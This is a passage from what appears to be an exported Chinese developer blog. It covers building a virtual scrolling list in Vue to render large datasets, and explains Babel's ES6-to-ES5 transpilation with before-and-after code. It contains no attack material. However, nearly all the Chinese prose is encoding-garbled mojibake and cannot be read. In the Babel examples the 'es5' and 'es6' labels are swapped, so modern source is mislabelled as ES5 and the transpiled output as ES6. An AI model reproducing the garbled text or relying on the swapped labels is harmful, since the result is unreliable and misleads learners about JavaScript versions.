é€’å‚æ•°ã€‚â‘¡å°†å‚æ•°æ”¾åˆ°getInstanceä¸­</li></ul><p>è§£å†³æ–¹æ³•</p><ul><li>ç”¨é™æ€æ–¹æ³•å®ç°</li></ul><h3 id="2-å·¥å‚æ¨¡å¼"><a href="#2-å·¥å‚æ¨¡å¼" class="headerlink" title="2. å·¥å‚æ¨¡å¼"></a>2. å·¥å‚æ¨¡å¼</h3>]]></content>
      
      
    </entry>
    
    <entry>
      <title>è™šæ‹Ÿåˆ—è¡¨ - æ¸²æŸ“10wæ¡æ•°æ®</title>
      <link href="/2020/04/26/%E8%99%9A%E6%8B%9F%E5%88%97%E8%A1%A8/"/>
      <url>/2020/04/26/%E8%99%9A%E6%8B%9F%E5%88%97%E8%A1%A8/</url>
      <content type="html"><![CDATA[<blockquote><p>äº§å“ï¼šç°åœ¨æœ‰10wæ¡æ•°æ®è¦å±•ç¤ºï¼Œä¸åˆ†é¡µï¼Œæ”¾ä¸€ä¸ªè¡¨æ ¼é‡ŒOKä¸ <br>æˆ‘  ï¼šè¿™ä¸€æ¡æ•°æ®100ä¸ªå±æ€§ï¼Œæµè§ˆå™¨holdä¸ä½çš„ <br>äº§å“ï¼šé‚£æœ€å¤šå‡ æ¡ <br>æˆ‘  ï¼š500 ï¼Ÿï¼Ÿï¼ˆ ç©ºæ°”å‡å›º3sâ€¦ï¼‰ ç­‰æˆ‘çœ‹çœ‹å†å›ä½ </p></blockquote><p><br></p><h3 id="1-ä¸ºä»€ä¹ˆè¦ç”¨è™šæ‹Ÿåˆ—è¡¨"><a href="#1-ä¸ºä»€ä¹ˆè¦ç”¨è™šæ‹Ÿåˆ—è¡¨" class="headerlink" title="1. ä¸ºä»€ä¹ˆè¦ç”¨è™šæ‹Ÿåˆ—è¡¨"></a>1. ä¸ºä»€ä¹ˆè¦ç”¨è™šæ‹Ÿåˆ—è¡¨</h3><p>å‡è®¾æˆ‘ä»¬çš„åˆ—è¡¨éœ€è¦å±•ç¤º1wæ¡æ•°æ®ï¼Œæˆ‘ä»¬åŒæ—¶å°†1wæ¡æ•°æ®æ¸²æŸ“åˆ°é¡µé¢ä¸­ã€‚çœ‹çœ‹ä¼šèŠ±è´¹å¤šå°‘æ—¶é—´ã€‚å¯ä»¥ç²—ç•¥çš„ç»Ÿè®¡åˆ°ï¼ŒJSçš„è¿è¡Œæ—¶é—´ä¸º<em><code>38ms</code></em>,ä½†æ¸²æŸ“å®Œæˆåçš„æ€»æ—¶é—´ä¸º<em><code>957ms</code></em>ã€‚å½“JSæ‰§è¡Œæ ˆä¸­çš„äº‹ä»¶å…¨éƒ¨æ‰§è¡Œå®Œåï¼Œæ‰ä¼šè§¦å‘æ¸²æŸ“çº¿ç¨‹å¯¹é¡µé¢è¿›è¡Œæ¸²æŸ“ã€‚</p><p><img src="/2020/04/26/è™šæ‹Ÿåˆ—è¡¨/2.png"></p><p>é€šè¿‡Performanceæ¥çœ‹ä»æ‰§è¡Œåˆ°æ¸²æŸ“ç»“æŸï¼Œæ—¶é—´èŠ±åœ¨äº†å“ªé‡Œï¼š</p><ul><li><em><code>Event(click)</code></em> : 40.84ms</li><li><em><code>Recalculate Style</code></em> : 105.08ms</li><li><em><code>Layout</code></em> : 731.56ms</li><li><em><code>Update Layer Tree</code></em> : 58.87ms</li><li><em><code>Paint</code></em> : 15.32ms</li></ul><p>æ¶ˆè€—æ—¶é—´æœ€å¤šçš„ä¸¤ä¸ªé˜¶æ®µæ˜¯</p><ul><li><em><code>Recalculate Style</code></em>ï¼š æ ·å¼è®¡ç®—ï¼Œæµè§ˆå™¨æ ¹æ®cssé€‰æ‹©å™¨è®¡ç®—å“ªäº›å…ƒç´ åº”è¯¥åº”ç”¨å“ªäº›è§„åˆ™ï¼Œç¡®å®šæ¯ä¸ªå…ƒç´ å…·ä½“çš„æ ·å¼</li><li><em><code>Layout</code></em>ï¼š å¸ƒå±€ï¼ŒçŸ¥é“å…ƒç´ åº”ç”¨å“ªäº›è§„åˆ™ä¹‹åï¼Œæµè§ˆå™¨å¼€å§‹è®¡ç®—å®ƒè¦å æ®çš„ç©ºé—´å¤§å°åŠå…¶åœ¨å±å¹•çš„ä½ç½®</li></ul><p>å½“DOMèŠ‚ç‚¹æ•°é‡è¶Šå¤šçš„æ—¶å€™ï¼Œæ¯ä¸€æ¬¡æ»šåŠ¨çš„æ—¶å€™ï¼Œéƒ½ä¼šæ¶ˆè€—å¤§é‡çš„æ—¶é—´ï¼Œå†…å­˜ç”¨æ¥è®¡ç®—å¸ƒå±€ï¼Œæœ€åå¯¼è‡´é¡µé¢å¡é¡¿ã€‚ä½†æ˜¯å¦‚æœæˆ‘ä»¬åªè€ƒè™‘èƒ½çœ‹åˆ°çš„æ•°æ®ï¼Œé‚£å®é™…æ¸²æŸ“çš„æ•°æ®é‡å°±ä¼šéå¸¸çš„å°‘ï¼Œå‡å°‘äº†å¤§é‡ä¸å¿…è¦çš„é‡ç»˜ã€‚</p><p><br></p><h3 id="2-å®ç°ä¸€ä¸ªè™šæ‹Ÿåˆ—è¡¨"><a href="#2-å®ç°ä¸€ä¸ªè™šæ‹Ÿåˆ—è¡¨" class="headerlink" title="2. å®ç°ä¸€ä¸ªè™šæ‹Ÿåˆ—è¡¨"></a>2. å®ç°ä¸€ä¸ªè™šæ‹Ÿåˆ—è¡¨</h3><p>è™šæ‹Ÿåˆ—è¡¨ï¼Œå®é™…ä¸Šæ˜¯åœ¨é¦–å±åŠ è½½çš„æ—¶å€™ï¼ŒåªåŠ è½½<em>å¯è§†åŒºåŸŸ</em>éœ€è¦çš„åˆ—è¡¨é¡¹ï¼Œå½“æ»šåŠ¨å‘ç”Ÿæ—¶ï¼ŒåŠ¨æ€è®¡ç®—æ‹¿åˆ°<em>å¯è§†åŒºåŸŸ</em>çš„åˆ—è¡¨é¡¹ï¼Œå¹¶å°†<em>éå¯è§†åŒºåŸŸ</em>å†…å­˜åœ¨çš„åˆ—è¡¨é¡¹åˆ é™¤ã€‚</p><p><img src="/2020/04/26/è™šæ‹Ÿåˆ—è¡¨/3.png" style="width:500px"></p><p>åˆ›å»ºä¸€ä¸ª<em><code>infinite-list-phantom</code></em>è™šæ‹Ÿdivï¼ŒæŠŠå®ƒçš„é«˜åº¦è®¾ç½®æˆæ€»é«˜åº¦ï¼Œç”¨æ¥æ’‘é«˜æ•´ä¸ªdivï¼Œç”Ÿæˆæ»šåŠ¨æ¡ã€‚<br>æ»šåŠ¨æ—¶ï¼Œè®¾ç½®å¯è§†åˆ—è¡¨<em><code>infinite-list</code></em> çš„ <em><code>transform</code></em>ä½ç§»å±æ€§ï¼Œä¸ºæ»šåŠ¨é«˜åº¦ï¼Œå¹¶æ›´æ–°å¯è§†åˆ—è¡¨æ•°æ®ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ref</span>=<span class="string">"list"</span> <span class="attr">id</span>=<span class="string">"infinite-list-container"</span> @<span class="attr">scroll</span>=<span class="string">"handleScroll($event)"</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- å®¹å™¨çš„å ä½divï¼Œé«˜åº¦ä¸ºæ€»åˆ—è¡¨é«˜åº¦ï¼Œç”¨äºç”Ÿæˆæ»šåŠ¨æ¡--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"infinite-list-phantom"</span> <span class="attr">:style</span>=<span class="string">"&#123; height: listHeight + 'px' &#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- å¯è§†åˆ—è¡¨ï¼Œå®é™…æ¸²æŸ“åˆ—è¡¨ --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"infinite-list"</span> <span class="attr">:style</span>=<span class="string">"&#123; transform: getTransform &#125;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> </span></span><br><span class="line"><span class="tag">      <span class="attr">class</span>=<span class="string">"infinite-list-item"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">v-for</span>=<span class="string">"item in visibleData"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:key</span>=<span class="string">"item.id"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:style</span>=<span class="string">"&#123; height: itemSize + 'px', lineHeight: itemSize + 'px' &#125;"</span></span></span><br><span class="line"><span class="tag">    &gt;</span>&#123;&#123; item.value &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">  el: <span class="string">'#infinite-list-container'</span>,</span></span><br><span class="line"><span class="undefined">  data() &#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">this</span>.itemSize = <span class="number">30</span>; <span class="comment">// æ¯é¡¹é«˜åº¦</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">      listData: [], <span class="comment">// æ‰€æœ‰åˆ—è¡¨æ•°æ®</span></span></span><br><span class="line"><span class="javascript">      start: <span class="number">0</span>, <span class="comment">// å¼€å§‹ç´¢å¼•</span></span></span><br><span class="line"><span class="javascript">      end: <span class="number">0</span>, <span class="comment">// ç»“æŸç´¢å¼•</span></span></span><br><span class="line"><span class="javascript">      screenHeight: <span class="number">0</span>, <span class="comment">// å¯è§†åŒºåŸŸé«˜åº¦</span></span></span><br><span class="line"><span class="javascript">      startOffset: <span class="number">0</span>, <span class="comment">// åç§»é‡</span></span></span><br><span class="line"><span class="undefined">    &#125;;</span></span><br><span class="line"><span class="undefined">  &#125;,</span></span><br><span class="line"><span class="undefined">  computed: &#123;</span></span><br><span class="line"><span class="javascript">    visibleData() &#123; <span class="comment">// çœŸå®æ˜¾ç¤ºçš„åˆ—è¡¨æ•°æ®</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">return</span> <span class="keyword">this</span>.listData.slice(<span class="keyword">this</span>.start, <span class="built_in">Math</span>.min(<span class="keyword">this</span>.end, <span class="keyword">this</span>.listData.length))</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="javascript">    visibleCount() &#123; <span class="comment">// å¯æ˜¾ç¤ºçš„åˆ—è¡¨é¡¹æ•°</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">return</span> <span class="built_in">Math</span>.ceil(<span class="keyword">this</span>.screenHeight / <span class="keyword">this</span>.itemSize)</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="javascript">    listHeight() &#123; <span class="comment">// åˆ—è¡¨æ€»é«˜åº¦</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">return</span> <span class="keyword">this</span>.listData.length * <span class="keyword">this</span>.itemSize</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="javascript">    getTransform() &#123; <span class="comment">// åç§»é‡å¯¹åº”çš„style</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">return</span> <span class="string">`translate3d(0, <span class="subst">$&#123;<span class="keyword">this</span>.startOffset&#125;</span>px, 0)`</span></span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;,</span></span><br><span class="line"><span class="undefined">  methods: &#123;</span></span><br><span class="line"><span class="undefined">    handleScroll() &#123;</span></span><br><span class="line"><span class="javascript">      <span class="comment">// å½“å‰æ»šåŠ¨ä½ç½®</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">let</span> scrollTop = <span class="keyword">this</span>.$refs.list.scrollTop;</span></span><br><span class="line"><span class="javascript">      <span class="comment">// è®¾ç½®å¯è§†åˆ—è¡¨å¼€å§‹ï¼Œç»“æŸç´¢å¼•</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.start = <span class="built_in">Math</span>.floor(scrollTop / <span class="keyword">this</span>.itemSize);</span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.end = <span class="keyword">this</span>.start + <span class="keyword">this</span>.visibleCount;</span></span><br><span class="line"><span class="javascript">      <span class="comment">// æ›´æ–°åç§»é‡</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.startOffset = scrollTop - (scrollTop % <span class="keyword">this</span>.itemSize)</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;,</span></span><br><span class="line"><span class="undefined">  mounted() &#123;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// åˆå§‹åŒ–å‡æ•°æ®</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> arr = [];</span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">20000</span>; i++) &#123;</span></span><br><span class="line"><span class="javascript">      arr.push(&#123; <span class="attr">id</span>: i, <span class="attr">value</span>: <span class="string">`ç¬¬<span class="subst">$&#123;i + <span class="number">1</span>&#125;</span>æ¡æ•°æ®å†…å®¹`</span>&#125;);</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">this</span>.listData = arr;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.screenHeight = <span class="keyword">this</span>.$el.clientHeight;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.start = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.end = <span class="keyword">this</span>.start + <span class="keyword">this</span>.visibleCount;</span></span><br><span class="line"><span class="undefined">    &#125;, 0)</span></span><br><span class="line"><span class="undefined">  &#125;,</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css"><span class="selector-id">#infinite-list-container</span> &#123;</span></span><br><span class="line"><span class="undefined">  height: 500px;</span></span><br><span class="line"><span class="undefined">  overflow: auto;</span></span><br><span class="line"><span class="undefined">  position: relative;</span></span><br><span class="line"><span class="undefined">  -webkit-overflow-scrolling: touch;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.infinite-list-phantom</span> &#123;</span></span><br><span class="line"><span class="undefined">  position: absolute;</span></span><br><span class="line"><span class="undefined">  top: 0;</span></span><br><span class="line"><span class="undefined">  left: 0;</span></span><br><span class="line"><span class="undefined">  right: 0;</span></span><br><span class="line"><span class="undefined">  z-index: -1;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.infinite-list</span> &#123;</span></span><br><span class="line"><span class="undefined">  position: absolute;</span></span><br><span class="line"><span class="undefined">  top: 0;</span></span><br><span class="line"><span class="undefined">  left: 0;</span></span><br><span class="line"><span class="undefined">  right: 0;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.infinite-list-item</span> &#123;</span></span><br><span class="line"><span class="css">  <span class="selector-tag">border-bottom</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#999</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://juejin.im/post/5d76f469f265da039a28aff7" target="_blank" rel="noopener">ã€Œå‰ç«¯è¿›é˜¶ã€é«˜æ€§èƒ½æ¸²æŸ“åä¸‡æ¡æ•°æ®(æ—¶é—´åˆ†ç‰‡)</a></li><li><a href="https://juejin.im/post/5db684ddf265da4d495c40e5" target="_blank" rel="noopener">ã€Œå‰ç«¯è¿›é˜¶ã€é«˜æ€§èƒ½æ¸²æŸ“åä¸‡æ¡æ•°æ®(è™šæ‹Ÿåˆ—è¡¨)</a></li><li><a href="https://juejin.im/post/5ce75d205188252dc544e7fd" target="_blank" rel="noopener">é•¿åˆ—è¡¨ä¼˜åŒ–ä¹‹è™šæ‹Ÿåˆ—è¡¨</a></li></ul>]]></content>
      
      <categories>
          
          <category> Bug </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Babelï¼šç”¨es5å®ç°es6è¯­æ³•</title>
      <link href="/2020/04/23/babel/"/>
      <url>/2020/04/23/babel/</url>
      <content type="html"><![CDATA[<blockquote><p>å› ä¸ºè¦å…¼å®¹IEï¼Œè·‘äº†ä¸€ä¸‹Babelæ–‡æ¡£ï¼Œå‘ç°ã€‚ã€‚æ©ï¼Ÿå…¼å®¹IEï¼Œä¸å°±æ˜¯æŠŠES6è¯­æ³•è½¬æ¢æˆES5è¯­æ³•å—ï¼æœæ–­è§£é”è€ƒç‚¹ï¼</p></blockquote><p><br></p><h3 id="1-ç®€ä»‹"><a href="#1-ç®€ä»‹" class="headerlink" title="1. ç®€ä»‹"></a>1. ç®€ä»‹</h3><p>Babelæ˜¯ä¸€ä¸ªJavascriptç¼–è¯‘å™¨ï¼Œç”¨äºå°†ES5+çš„ä»£ç è½¬æ¢ä¸ºå‘åå…¼å®¹çš„JSè¯­æ³•ï¼Œä»¥ä¾¿èƒ½å¤Ÿè¿è¡Œåœ¨å½“å‰å’Œæ—§ç‰ˆæœ¬çš„æµè§ˆå™¨æˆ–å…¶ä»–ç¯å¢ƒä¸­ã€‚<a href="https://www.babeljs.cn/docs/usage" target="_blank" rel="noopener">å®˜æ–¹Demo</a></p><p>Babel çš„åŠŸèƒ½å¾ˆçº¯ç²¹ï¼Œå®ƒåªæ˜¯ä¸€ä¸ªç¼–è¯‘å™¨ï¼Œå¤§å¤šæ•°ç¼–è¯‘å™¨çš„å·¥ä½œè¿‡ç¨‹å¯ä»¥åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼š</p><ul><li>è§£æï¼ˆParsingï¼‰ï¼šå°†ä»£ç å­—ç¬¦ä¸²è§£ææˆæŠ½è±¡è¯­æ³•æ ‘ã€‚</li><li>è½¬æ¢ï¼ˆTransformationï¼‰ï¼šå¯¹æŠ½è±¡è¯­æ³•æ ‘è¿›è¡Œè½¬æ¢æ“ä½œã€‚</li><li>ç”Ÿæˆï¼ˆCode Generationï¼‰: æ ¹æ®å˜æ¢åçš„æŠ½è±¡è¯­æ³•æ ‘å†ç”Ÿæˆä»£ç å­—ç¬¦ä¸²ã€‚</li></ul><table><thead><tr><th>ç»„æˆ</th><th style="text-align:right">ä½œç”¨</th></tr></thead><tbody><tr><td>@babel/core</td><td style="text-align:right">å®ç°è¯­æ³•è§£æï¼Œè½¬æ¢</td></tr><tr><td>@babel/preset-env</td><td style="text-align:right">pluginsæ˜¯ä¸€äº›jsç¨‹åºï¼Œç”¨æ¥æŒ‡å¯¼babelå¦‚ä½•å¯¹ä»£ç æ‰§è¡Œè½¬æ¢ã€‚ä½ å¯ä»¥å†™è‡ªå·±çš„æ’ä»¶ã€‚<br>presetæ˜¯å¤šä¸ªpluginsçš„ç»„åˆã€‚</td></tr><tr><td>@babel/cli</td><td style="text-align:right">å…è®¸ä½ åœ¨ç»ˆç«¯ç”¨å‘½ä»¤è¡Œå®ç°è¯­æ³•è½¬æ¢ã€‚æŠŠsrcç›®å½•ä¸‹çš„æ‰€æœ‰jsæ–‡ä»¶ï¼Œç¼–è¯‘è¾“å‡ºåˆ°libç›®å½•ã€‚<br><code>./node_modules/.bin/babel src --out-dir lib</code> </td></tr><tr><td>@babel/polyfill</td><td style="text-align:right">Babelé»˜è®¤åªè½¬æ¢æ–°çš„JSè¯­æ³•ï¼Œè€Œä¸è½¬æ¢æ–°çš„APIï¼Œå¦‚Iterator, Generator, Set, Maps, Proxy, Reflect, Symbol, Promiseç­‰å…¨å±€å¯¹è±¡ã€‚å½“è¿è¡Œç¯å¢ƒ(<em>IE</em>)å¹¶æ²¡æœ‰å®ç°ä¸€äº›å…¨å±€å¯¹è±¡æ—¶ï¼Œbabel-polyfillä¼šç»™å…¶åšå…¼å®¹ã€‚</td></tr></tbody></table><p><br></p><h3 id="1-1-BabelèŒè´£èŒƒå›´"><a href="#1-1-BabelèŒè´£èŒƒå›´" class="headerlink" title="1.1 BabelèŒè´£èŒƒå›´"></a>1.1 BabelèŒè´£èŒƒå›´</h3><p>Babel åªæ˜¯è½¬è¯‘æ–°æ ‡å‡†å¼•å…¥çš„è¯­æ³•ï¼Œæ¯”å¦‚ï¼š</p><ul><li>ç®­å¤´å‡½æ•°</li><li>let / const</li><li>è§£æ„</li></ul><p>å“ªäº›åœ¨ Babel èŒƒå›´å¤–ï¼Ÿå¯¹äºæ–°æ ‡å‡†å¼•å…¥çš„å…¨å±€å˜é‡ã€éƒ¨åˆ†åŸç”Ÿå¯¹è±¡æ–°å¢çš„åŸå‹é“¾ä¸Šçš„æ–¹æ³•ï¼š</p><ul><li>å…¨å±€å˜é‡<ul><li>Promise</li><li>Symbol</li><li>WeakMap</li><li>Set</li></ul></li><li>includes</li><li>generator å‡½æ•°</li></ul><p>å¯¹äºä¸Šé¢çš„è¿™äº› APIï¼ŒBabel æ˜¯ä¸ä¼šè½¬è¯‘çš„ï¼Œéœ€è¦å¼•å…¥ polyfill æ¥è§£å†³ã€‚</p><p><br></p><h3 id="2-es5å®ç°es6è¯­æ³•ç³–"><a href="#2-es5å®ç°es6è¯­æ³•ç³–" class="headerlink" title="2. es5å®ç°es6è¯­æ³•ç³–"></a>2. es5å®ç°<a href="https://github.com/lukehoban/es6features#readme" target="_blank" rel="noopener">es6è¯­æ³•ç³–</a></h3><p>è¦æƒ³çŸ¥é“babelæ€ä¹ˆå®ç°ES6è¯­æ³•ï¼Œç›´æ¥åˆ°<a href="https://babeljs.io/repl#?browsers=&amp;build=&amp;builtIns=false&amp;spec=false&amp;loose=false&amp;code_lz=MYewdgzgLgBAhjAvDATAbgFAOQRiA&amp;debug=false&amp;forceAllTransforms=false&amp;shippedProposals=false&amp;circleciRepo=&amp;evaluate=false&amp;fileSize=false&amp;timeTravel=false&amp;sourceType=module&amp;lineWrap=true&amp;presets=es2015%2Creact%2Cstage-2&amp;prettier=false&amp;targets=&amp;version=7.9.0&amp;externalPlugins=" target="_blank" rel="noopener">Babelå®˜ç½‘çš„REPLåœ¨çº¿ç¼–è¾‘å™¨</a>ï¼Œé…ç½®å¥½<code>preset</code>å’Œ<code>plugins</code>åï¼Œè¾“å…¥ä½ æƒ³è¦è½¬åŒ–çš„ä»£ç ï¼Œbabelè‡ªåŠ¨ä¼šç»™ä½ è¾“å‡ºè½¬åŒ–åçš„ä»£ç ã€‚</p><h4 id="2-1-let-const"><a href="#2-1-let-const" class="headerlink" title="2.1 let, const"></a>2.1 let, const</h4><ul><li><p>cosnt </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// es5</span></span><br><span class="line"><span class="keyword">const</span> a = <span class="number">1</span>;</span><br><span class="line">a = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// es6</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_readOnlyError</span>(<span class="params">name</span>) </span>&#123; <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"\""</span> + name + <span class="string">"\" is read-only"</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line">a = (_readOnlyError(<span class="string">"a"</span>), <span class="number">2</span>);</span><br></pre></td></tr></table></figure></li><li><p>å—çº§ä½œç”¨åŸŸ</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// es5</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> x = <span class="string">'foo'</span>;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="string">'bar'</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(x);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// es6</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> x = <span class="string">'foo'</span>;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">var</span> _x = <span class="string">'bar'</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(_x);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="2-2-ç®­å¤´å‡½æ•°"><a href="#2-2-ç®­å¤´å‡½æ•°" class="headerlink" title="2.2 ç®­å¤´å‡½æ•°"></a>2.2 ç®­å¤´å‡½æ•°</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// es5</span></span><br><span class="line"><span class="keyword">const</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>].map(<span class="function"><span class="params">v</span> =&gt;</span> v + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// es6 </span></span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].map(<span class="function"><span class="keyword">function</span> (<span class="params">v</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> v + <span class="number">1</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><br></p><h4 id="2-3-å‡½æ•°é»˜è®¤å‚æ•°"><a href="#2-3-å‡½æ•°é»˜è®¤å‚æ•°" class="headerlink" title="2.3 å‡½æ•°é»˜è®¤å‚æ•°"></a>2.3 å‡½æ•°é»˜è®¤å‚æ•°</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 